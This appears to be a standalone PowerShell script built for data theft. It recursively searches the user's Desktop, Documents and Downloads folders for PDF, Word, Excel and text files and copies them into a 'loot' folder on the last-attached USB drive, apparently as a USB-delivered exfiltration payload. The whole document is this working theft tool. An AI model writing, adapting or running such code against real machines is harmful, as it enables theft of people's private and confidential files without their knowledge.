# Define target folders to search for specified file types
$sourceDirs = @(
    [System.Environment]::GetFolderPath('Desktop'),
    [System.Environment]::GetFolderPath('MyDocuments'),
    [System.IO.Path]::Combine($env:USERPROFILE, "Downloads")
)

# File types to search for (case insensitive)
$extensions = @(".pdf", ".docx", ".xlsx", ".txt")

# Get the last plugged-in removable USB drive
$usbDrive = Get-CimInstance -ClassName Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 } | Sort-Object DeviceID -Descending | Select-Object -First 1

if ($usbDrive) {
    $destinationDir = Join-Path -Path $usbDrive.DeviceID -ChildPath "loot"

    # Create the 'loot' folder if it doesn't exist
    if (!(Test-Path -Path $destinationDir)) {
        try {
            New-Item -Path $destinationDir -ItemType Directory -Force -ErrorAction Stop | Out-Null
        } catch {
            exit
        }
    }

    # Search the specified folders for the defined file types and copy them to the loot folder
    foreach ($sourceDir in $sourceDirs) {
        if (Test-Path -Path $sourceDir) {
            $files = Get-ChildItem -Path $sourceDir -Recurse | Where-Object { 
                $extensions -contains $_.Extension.ToLower()
            }

            if ($files) {
                $files | ForEach-Object {
                    try {
                        # Log the file being copied (for debugging)
                        Write-Host "Copying: $($_.FullName)"
                        
                        # Copy each file to the loot folder on the USB drive
                        Copy-Item -Path $_.FullName -Destination $destinationDir -Force -ErrorAction Stop
                    } catch {
                        # Log any errors (for debugging)
                        Write-Host "Failed to copy: $($_.FullName)"
                        continue
                    }
                }
            }
        }
    }
}
